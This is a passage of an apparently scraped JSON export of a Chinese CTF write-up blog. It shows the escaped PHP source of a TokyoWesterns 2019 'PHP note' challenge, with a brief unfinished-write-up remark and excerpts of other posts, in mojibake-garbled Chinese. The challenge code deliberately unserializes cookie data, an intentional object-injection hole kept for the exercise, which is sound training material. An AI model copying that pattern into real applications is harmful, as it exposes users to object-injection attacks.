&apos;config.php&apos;;\n\nclass Note {\n    public function __construct($admin) {\n        $this-&gt;notes = array();\n        $this-&gt;isadmin = $admin;\n    }\n\n    public function addnote($title, $body) {\n        array_push($this-&gt;notes, [$title, $body]);\n    }\n\n    public function getnotes() {\n        return $this-&gt;notes;\n    }\n\n    public function getflag() {\n        if ($this-&gt;isadmin === true) {\n            echo FLAG;\n        }\n    }\n}\n\nfunction verify($data, $hmac) {\n    $secret = $_SESSION[&apos;secret&apos;];\n    if (empty($secret)) return false;\n    return hash_equals(hash_hmac(&apos;sha256&apos;, $data, $secret), $hmac);\n}\n\nfunction hmac($data) {\n    $secret = $_SESSION[&apos;secret&apos;];\n    if (empty($data) || empty($secret)) return false;\n    return hash_hmac(&apos;sha256&apos;, $data, $secret);\n}\n\nfunction gen_secret($seed) {\n    return md5(SALT . $seed . PEPPER);\n}\n\nfunction is_login() {\n    return !empty($_SESSION[&apos;secret&apos;]);\n}\n\nfunction redirect($action) {\n    header(&quot;Location: /?action=$action&quot;);\n    exit();\n}\n\n$method = $_SERVER[&apos;REQUEST_METHOD&apos;];\n$action = $_GET[&apos;action&apos;];\n\nif (!in_array($action, [&apos;index&apos;, &apos;login&apos;, &apos;logout&apos;, &apos;post&apos;, &apos;source&apos;, &apos;getflag&apos;])) {\n    redirect(&apos;index&apos;);\n}\n\nif ($action === &apos;source&apos;) {\n    highlight_file(__FILE__);\n    exit();\n}\n\n\nsession_start();\n\nif (is_login()) {\n    $realname = $_SESSION[&apos;realname&apos;];\n    $nickname = $_SESSION[&apos;nickname&apos;];\n\n    $note = verify($_COOKIE[&apos;note&apos;], $_COOKIE[&apos;hmac&apos;])\n            ? unserialize(base64_decode($_COOKIE[&apos;note&apos;]))\n            : new Note(false);\n}\n\nif ($action === &apos;login&apos;) {\n    if ($method === &apos;POST&apos;) {\n        $nickname = (string)$_POST[&apos;nickname&apos;];\n        $realname = (string)$_POST[&apos;realname&apos;];\n\n        if (empty($realname) || strlen($realname) &lt; 8) {\n            die(&apos;invalid name&apos;);\n        }\n\n        $_SESSION[&apos;realname&apos;] = $realname;\n        if (!empty($nickname)) {\n            $_SESSION[&apos;nickname&apos;] = $nickname;\n        }\n        $_SESSION[&apos;secret&apos;] = gen_secret($nickname);\n    }\n    redirect(&apos;index&apos;);\n}\n\nif ($action === &apos;logout&apos;) {\n    session_destroy();\n    redirect(&apos;index&apos;);\n}\n\nif ($action === &apos;post&apos;) {\n    if ($method === &apos;POST&apos;) {\n        $title = (string)$_POST[&apos;title&apos;];\n        $body = (string)$_POST[&apos;body&apos;];\n        $note-&gt;addnote($title, $body);\n        $data = base64_encode(serialize($note));\n        setcookie(&apos;note&apos;, (string)$data);\n        setcookie(&apos;hmac&apos;, (string)hmac($data));\n    }\n    redirect(&apos;index&apos;);\n}\n\nif ($action === &apos;getflag&apos;) {\n    $note-&gt;getflag();\n}\n\n?&gt;\n&lt;!doctype html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;title&gt;PHP note&lt;/title&gt;\n    &lt;/head&gt;\n    &lt;style&gt;\n        textarea {\n            resize: none;\n            width: 300px;\n            height: 200px;\n        }\n    &lt;/style&gt;\n    &lt;body&gt;\n        &lt;?php\n        if (!is_login()) {\n            $realname = htmlspecialchars($realname);\n            $nickname = htmlspecialchars($nickname);\n        ?&gt;\n        &lt;form action=&quot;/?action=login&quot; method=&quot;post&quot; id=&quot;login&quot;&gt;\n            &lt;input type=&quot;text&quot; id=&quot;firstname&quot; placeholder=&quot;First Name&quot;&gt;\n            &lt;input type=&quot;text&quot; id=&quot;lastname&quot; placeholder=&quot;Last Name&quot;&gt;\n            &lt;input type=&quot;text&quot; name=&quot;nickname&quot; id=&quot;nickname&quot; placeholder=&quot;nickname&quot;&gt;\n            &lt;input type=&quot;hidden&quot; name=&quot;realname&quot; id=&quot;realname&quot;&gt;\n            &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;\n        &lt;/form&gt;\n        &lt;?php\n        } else {\n        ?&gt;\n        &lt;h1&gt;Welcome, &lt;?=$realname?&gt;&lt;?= !empty($nickname) ? &quot; ($nickname)&quot; : &quot;&quot; ?&gt;&lt;/h1&gt;\n        &lt;a href=&quot;/?action=logout&quot;&gt;logout&lt;/a&gt;\n        &lt;!-- &lt;a href=&quot;/?action=source&quot;&gt;source&lt;/a&gt; --&gt;\n        &lt;br/&gt;\n        &lt;br/&gt;\n        &lt;?php\n            foreach($note-&gt;getnotes() as $k =&gt; $v) {\n                list($title, $body) = $v;\n                $title = htmlspecialchars($title);\n                $body = htmlspecialchars($body);\n        ?&gt;\n        &lt;h2&gt;&lt;?=$title?&gt;&lt;/h2&gt;\n        &lt;p&gt;&lt;?=$body?&gt;&lt;/p&gt;\n        &lt;?php\n            }\n        ?&gt;\n        &lt;form action=&quot;/?action=post&quot; method=&quot;post&quot;&gt;\n            &lt;input type=&quot;text&quot; name=&quot;title&quot; placeholder=&quot;title&quot;&gt;\n            &lt;br&gt;\n            &lt;textarea name=&quot;body&quot; placeholder=&quot;body&quot;&gt;&lt;/textarea&gt;\n            &lt;button type=&quot;submit&quot;&gt;Post&lt;/button&gt;\n        &lt;/form&gt;\n        &lt;?php\n        }\n        ?&gt;\n        &lt;?php\n        ?&gt;\n        &lt;script&gt;\n            document.querySelector(&quot;form#login&quot;).addEventListener(&apos;submit&apos;, (e) =&gt; {\n                const nickname = document.querySelector(&quot;input#nickname&quot;)\n                const firstname = document.querySelector(&quot;input#firstname&quot;)\n                const lastname = document.querySelector(&quot;input#lastname&quot;)\n                document.querySelector(&quot;input#realname&quot;).value = `${firstname.value} ${lastname.value}`\n                if (nickname.value.length == 0 &amp;&amp; firstname.value.length &gt; 0 &amp;&amp; lastname.value.length &gt; 0) {\n                    nickname.value = firstname.value.toLowerCase()[0] + lastname.value.toLowerCase()\n                }\n            })\n        &lt;/script&gt;\n    &lt;/body&gt;\n&lt;/html&gt; </code></pre><p>æ²¡åšå®Œï¼Œå…ˆç•™å‘</p>\n","text":"TokyoWestern 20199/5/2019 5:20:26 PM ğŸ¨ji2xji2æ‹¿åˆ°é¢˜ç›®ç¬¬ä¸€ååº”å°±æ˜¯XXEï¼Œç›´æ¥æ‹¿ç€ä¹‹å‰åšå®¢çš„payloadä¸€é¡¿è¯•ï¼Œç»“æœå¾—åˆ°äº†failed to decode xmlï¼Œç„¶åå°±åœ¨æƒ³æ˜¯ä¸æ˜¯æ€è·¯é”™äº†ï¼Œæ²¡æƒ³åˆ°æ˜¯è¯»çš„æ–‡ä»¶ä¸å­˜åœ¨ï¼Œå…¶å®æ‹¿æœ€ç®€å•çš„&l","link":"","raw":null,"photos":[],"categories":[{"name":"WP","slug":"WP","count":7,"path":"api/categories/WP.json"}],"tags":[{"name":"SSTI","slug":"SSTI","count":2,"path":"api/tags/SSTI.json"},{"name":"RSA","slug":"RSA","count":4,"path":"api/tags/RSA.json"}]},{"title":"JarvisOJ WP","slug":"JarvisOJ","date":"2019-08-01T11:37:28.000Z","updated":"2019-08-24T14:43:46.279Z","comments":true,"path":"api/articles/JarvisOJ.json","excerpt":"<p>çœŸæ˜¯è¢«è‡ªå·±èœå“­äº†ï¼Œæš‘å‡ç¬¬ä¸€ä¸ªæœˆä¸€å®šè¦æŠŠWEBåˆ·å®Œå†™å®ŒWPï¼</p>","keywords":null,"cover":"http://wx3.sinaimg.cn/mw690/006boCb9ly1g5iufmppywj30kv03igm3.jpg","content":null,"text":"çœŸæ˜¯è¢«è‡ªå·±èœå“­äº†ï¼Œæš‘å‡ç¬¬ä¸€ä¸ªæœˆä¸€å®šè¦æŠŠWEBåˆ·å®Œå†™å®ŒWPï¼WEBæœ‰æ—¶é—´ä¹Ÿåšåšåˆ«çš„PORT51é¢˜ç›®é“¾æ¥ï¼šhttp://web.jarvisoj.com:32770/è¦ç”¨æœ¬åœ°51ç«¯å£å»è®¿é—®curl --local-port 51 http://web.jarvisoj.com:327","link":"","raw":null,"photos":[],"categories":[{"name":"WP","slug":"WP","count":7,"path":"api/categories/WP.json"}],"tags":[{"name":"WP","slug":"WP","count":5,"path":"api/tags/WP.json"},{"name":"serialize","slug":"serialize","count":4,"path":"api/tags/serialize.json"},{"name":"SQL","slug":"SQL","count":4,"path":"api/tags/SQL.json"},{"name":"å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»","slug":"å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»","count":1,"path":"api/tags/å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡».json"}]}]}